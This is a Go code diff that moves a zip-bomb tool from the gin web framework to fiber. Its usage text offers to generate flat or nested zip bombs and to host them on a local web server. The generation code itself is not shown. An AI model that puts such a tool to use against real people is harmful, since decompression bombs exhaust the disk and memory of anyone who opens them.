@@ -4,16 +4,15 @@ import (
 	"ARE-YOU-BOMBED/utils"
 	"fmt"
 	"log"
-	"net/http"
 	"os"
 	"strconv"
 
-	"github.com/gin-gonic/gin"
+	"github.com/gofiber/fiber/v2"
 	"github.com/joho/godotenv"
 )
 
-func home(c *gin.Context) {
-	c.String(http.StatusOK, "You're BOMBED!!!")
+func home(c *fiber.Ctx) error {
+	return c.SendString("You're BOMBED!!!")
 }
 
 func main() {
@@ -21,6 +20,7 @@ func main() {
 	if err != nil {
 		log.Fatal("Error loading .env file")
 	}
+
 	if len(os.Args) < 2 {
 		usage := "- Generate flat zip bomb\nCommand: go run main.go generate flat <number of files>\n\n- Generate nested zip bomb\nCommand: go run main.go generate nested <depth>\n\n- Run the server\nCommand: go run main.go host"
 		fmt.Println(usage)
@@ -38,9 +38,9 @@ func main() {
 			utils.GenerateFlat(count)
 		}
 	} else if Isgenerate == "host" {
-		router := gin.Default()
-		router.GET("/", home)
-		router.Static("/static", "./bomb")
-		router.Run("localhost:" + os.Getenv("PORT"))
+		app := fiber.New()
+		app.Get("/", home)
+		app.Static("/static", "./bomb")
+		log.Fatal(app.Listen(os.Getenv("PORT")))
 	}
 }
